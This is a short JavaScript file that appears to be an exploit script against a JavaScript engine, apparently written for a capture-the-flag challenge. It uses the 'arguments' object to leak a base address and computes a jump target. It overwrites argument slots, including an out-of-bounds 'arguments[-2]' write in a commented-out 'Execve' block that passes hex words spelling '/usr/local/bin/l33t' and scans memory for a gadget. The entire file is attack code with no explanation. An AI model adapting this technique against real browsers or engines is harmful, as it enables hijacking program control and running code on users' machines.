if (1 > 0) {
    var current_base;
    function func() {
        var offset = 0x002e3fe4f8e000 - 50851959333187;
        alert(arguments[0]);
        current_base = (arguments[0] + offset);
    }
    func();
    alert(current_base);
    var t = 0xfff050f5f54;
    var t = 0xfff050f5f54;
    var t = 0xfff050f5f54;
    var t = 0xfff050f5f54;
    var offset2 = 0x6FEEF9B851b0 - 0x006feef9b85000;
    var jump_location = offset2 + current_base;
    alert(jump_location);
    function func4(){
        function func3(){
            arguments[0] = jump_location;
            //var x = 0xff || jump_location;
        }
        func3();
    }
    func4();
    // Execve =
    /*function func2(i,j,k,l,m){
        arguments[-2] = jump_location;
        return;
    }
    func2(0x2F757372,0x2F6C6F63,0x616C2F62,0x696E2F6C,0x33337400);
    var jump_offset = 0x100;
    var first_jump = jump_offset + current_base;
    var save_i = 0;
    for (var i = 0; i < 100000000; i += 1) {
        if ((first_jump & 0xFFFFFF) == 0x5f0F34) {
            alert(first_jump);
            save_i = i;
            i = 100000000;
        } else{
            first_jump += 0x2c;
        }
    }*/
}

